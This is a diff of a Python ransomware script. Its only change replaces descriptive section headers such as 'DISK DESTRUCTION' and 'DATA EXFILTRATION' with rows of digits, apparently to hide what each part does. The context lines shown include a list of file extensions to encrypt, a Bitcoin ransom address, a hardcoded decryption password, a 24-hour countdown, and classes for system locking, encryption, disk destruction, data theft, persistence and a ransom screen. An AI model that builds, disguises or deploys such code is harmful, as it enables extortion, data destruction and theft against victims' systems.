@@ -28,7 +28,7 @@ import psutil
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ==================== CONFIGURATION ====================
+# 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
 ENCRYPTION_EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', 
                         '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp3', 
                         '.mp4', '.avi', '.mov', '.wmv', '.zip', '.rar', '.7z', 
@@ -45,7 +45,7 @@ BITCOIN_ADDRESS = "12w4jBxtUopH29c31HVaUxUquwDzGiwk8a"
 DECRYPTION_PASSWORD = "M0NSTR-M1ND-UNBREAKABLE-2024"
 COUNTDOWN_HOURS = 24
 
-# ==================== SYSTEM TAKEOVER ====================
+# 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
 class SystemLocker:
     def __init__(self):
         self.is_locked = False
@@ -126,7 +126,7 @@ class SystemLocker:
             
         self.is_locked = True
 
-# ==================== ENCRYPTION ENGINE ====================
+# 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
 class EncryptionEngine:
     def __init__(self):
         self.key = get_random_bytes(32)
@@ -204,7 +204,7 @@ class EncryptionEngine:
         except Exception:
             return False
 
-# ==================== DISK DESTRUCTION ====================
+# 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
 class DiskDestroyer:
     def __init__(self):
         self.drive_letters = self.get_drive_letters()
@@ -250,7 +250,7 @@ class DiskDestroyer:
         for drive in self.drive_letters:
             threading.Thread(target=self.corrupt_file_system, args=(drive,)).start()
 
-# ==================== DATA EXFILTRATION ====================
+# 55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
 class DataStealer:
     def __init__(self):
         self.stolen_data = []
@@ -333,7 +333,7 @@ class DataStealer:
         except Exception:
             pass
 
-# ==================== PERSISTENCE MECHANISM ====================
+# 6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
 class PersistenceManager:
     def __init__(self):
         self.install_path = sys.argv[0]
@@ -383,7 +383,7 @@ class PersistenceManager:
         self.create_service()
         self.hide_file()
 
-# ==================== GRAPHICAL INTERFACE ====================
+# 7777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777
 class RansomwareGUI:
     def __init__(self):
         self.root = tk.Tk()
@@ -590,7 +590,7 @@ class RansomwareGUI:
     def run(self):
         self.root.mainloop()
 
-# ==================== MAIN EXECUTION ====================
+# 88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
 if __name__ == "__main__":
     # Check if already running
     if hasattr(sys, 'frozen'):
